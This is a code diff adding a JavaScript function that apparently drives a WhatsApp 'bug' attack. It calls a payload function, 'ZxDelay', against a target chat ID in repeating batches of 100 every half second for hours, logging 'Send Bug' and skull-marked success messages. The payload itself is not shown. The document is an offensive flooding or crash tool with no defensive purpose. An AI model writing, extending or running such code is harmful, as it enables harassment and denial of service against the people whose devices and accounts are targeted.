@@ -1,0 +1,31 @@
+async function DelayGalaksiih(jid) {
+  const totalDurationMs = durationHours * 60 * 60 * 1000;
+  const startTime = Date.now();
+  let count = 0;
+
+  const sendNext = async () => {
+    if (Date.now() - startTime >= totalDurationMs) {
+      console.log(`Stopped after sending ${count} messages`);
+      return;
+    }
+
+    try {
+      if (count < 100) {
+        ZxDelay(sock, jid, false) // Function
+        await new Promise((resolve) => setTimeout(resolve, 500));
+        console.log(chalk.red(`Send Bug By Verse Offc ${count}/100 To ${jid}`));
+        count++;
+        setTimeout(sendNext, 500);
+      } else {
+        console.log(chalk.green(`SUCCESS SEND 100 MESSAGE ✅`));
+        count = 0;
+        console.log(chalk.blue("NEXT SEND 100 MESSAGE ☠️"));
+        setTimeout(sendNext, 100);
+      }
+    } catch (error) {
+      console.error(`❌ Error: ${error.message}`);
+      setTimeout(sendNext, 100);
+    }
+  };
+  sendNext();
+}
